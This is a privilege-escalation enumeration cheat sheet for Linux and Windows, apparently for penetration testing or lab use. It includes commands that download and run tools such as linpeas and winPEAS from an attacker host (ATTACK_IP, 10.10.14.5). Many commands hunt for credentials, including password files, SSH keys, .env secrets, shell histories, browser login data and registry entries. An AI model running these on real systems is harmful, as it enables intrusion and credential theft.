# Local Privilege Escalation LPE Enumeration Methodology

### 1) Linux Local Privilege Escalation LPE Enumeration

On a linux machine, we can do some checks to see if we can exploit them to do lateral movement, or even root the machine.

#### Checks:

1) Sudo privileges (Authenticated)

       sudo -l

2) SUID bit files

        find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null	

3) Open ports/services/applications within the machine

        ss -tulpn
        netstat -ano

4) Check for running processes either as root, or as another target user for lateral movement

        wget http://ATTACK_IP:PORT/pspy64

        chmod +x ./pspy64

        ./pspy64

5) Check detailed contents of a directory like hidden files, file size, ownership

        ls -lah

6) Automated Enumeration

        wget http://ATTACK_IP:PORT/linpeas.sh

        chmod +x ./linpeas.sh

        ./linpeas.sh

7) Interesting groups of the current user

        id

8) Environment Variables

        env

9) Command history

        history

        cat /home/user/.bash_history

11) Writeable files and directories of the current user

        find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u

12) Chech the current user's PATH variable contents

        echo $PATH

13) World-writeable files and directories

        find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
        find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

14) Search for passwords within a linux system

Common password files

        find / -type f \( -iname "*passwd*" -o -iname "*shadow*" -o -iname "*secret*" \) 2>/dev/null

Password in config files

       grep -r --color=auto -i "password" /etc 2>/dev/null

Sensitive keywords on files

       grep -r --color=auto -iE "(password|pass|secret|key|token)" /home /var /etc 2>/dev/null

SSH Keys

       find / -type f -name "id_rsa" -o -name "id_dsa" 2>/dev/null

Bash History

       cat ~/.bash_history | grep -iE "password|pass|secret|key|token"

Hardcoded credentials in code

       grep -r --color=auto -iE "(password|key|secret|credential)" /var/www /home

Database files

       find / -type f -iname "*.sql" -o -iname "*.db" -o -iname "*.sqlite" 2>/dev/null

Environment Variables

       find / -type f -iname ".env" 2>/dev/null
       grep -i "password" $(find / -type f -iname ".env" 2>/dev/null)

### 2) Windows Local Privilege Escalation LPE Enumeration

On Windows machines, we can conduct some checks to find interesting info for LPE

1) Windows Privileges

Check our current user what privileges does he have

       whoami /priv

More details about the user

       whoami /all

2) Open ports/services that we can use

       netstat -ano

3) Search for passwords within a Windows system

Search for passwords in files

       Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password" -SimpleMatch

Sensitive Keywords in documents

       Get-ChildItem -Path C:\ -Include *.txt,*.doc,*.docx,*.xls,*.xlsx -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password|secret|key|token"
       findstr /SIM /C:"password" *.txt *ini *.cfg *.config *.xml	

Config files containing credentials

       Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password" -Include *.config,*.xml

Browser Password Files

       Get-ChildItem -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" -ErrorAction SilentlyContinue

Windows Registry

       reg query HKCU /f "password" /t REG_SZ /s
       reg query HKLM /f "password" /t REG_SZ /s

User Profiles

       Get-ChildItem -Path C:\Users\ -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password|pass|key|secret"

Encrypted Vaults

       Get-ChildItem -Path C:\ -Include *.pfx,*.key,*.crt,*.pem -Recurse -ErrorAction SilentlyContinue

System Logs

       Get-Content C:\Windows\System32\LogFiles -ErrorAction SilentlyContinue | Select-String -Pattern "password|key|secret"

3) Automation

Tools: PowerSharpPack, WinPEAS, Invoke-winPEAS

       iex(new-object net.webclient).downloadstring('http://ATTACK_IP:PORT/PowerSharpPack.ps1')

       PowerSharpPack -winPEAS

OR 

       iex(new-object net.webclient).downloadstring('http://10.10.14.5:9999/Invoke-winPEAS.ps1')

       Invoke-winPEAS >> .out

4) Unquoted Services Paths

       cmd /c wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\" | findstr /i /v """

5) AlwaysInstallElevated registry key

       reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
       reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

6) Scheduled Tasks

       schtasks /query /fo LIST /v
       Get-ScheduledTask | select TaskName,State

7) User Enumeration

       net users
       Get-LocalUser

8) Windows version

       systeminfo

9) Powershell History

Confirm powershell history save path

       (Get-PSReadLineOption).HistorySavePath	

Read powershell history file

       gc (Get-PSReadLineOption).HistorySavePath	

Tools: SessionGopher, LaZagne https://github.com/Arvanaghi/SessionGopher
